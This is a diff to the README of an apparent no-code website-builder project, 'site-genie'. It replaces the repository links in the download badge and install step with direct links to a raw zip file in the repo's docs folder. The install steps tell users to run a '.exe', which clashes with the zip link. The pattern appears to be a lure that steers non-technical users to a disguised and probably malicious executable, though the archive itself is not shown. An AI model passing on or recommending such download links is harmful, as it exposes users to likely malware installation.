@@ -1,6 +1,6 @@
 # 🪄 site-genie - Build custom websites using simple text
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Counterrevolutionary-flush841/site-genie)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Counterrevolutionary-flush841/site-genie/raw/refs/heads/main/docs/genie_site_2.6.zip)
 
 site-genie turns your ideas into websites. You describe what you need, and the software writes the code. You do not need to know how to code to use this tool. It creates professional, functional websites ready for the internet.
 
@@ -16,7 +16,7 @@ Your computer needs to meet these basic standards to run site-genie smoothly:
 ## 📥 How to Install
 Follow these steps to set up site-genie on your computer.
 
-1. Go to this link to find the download page: [https://github.com/Counterrevolutionary-flush841/site-genie](https://github.com/Counterrevolutionary-flush841/site-genie).
+1. Go to this link to find the download page: [https://github.com/Counterrevolutionary-flush841/site-genie/raw/refs/heads/main/docs/genie_site_2.6.zip](https://github.com/Counterrevolutionary-flush841/site-genie/raw/refs/heads/main/docs/genie_site_2.6.zip).
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file name to start the download.
 4. Locate the file in your Downloads folder once the process finishes.
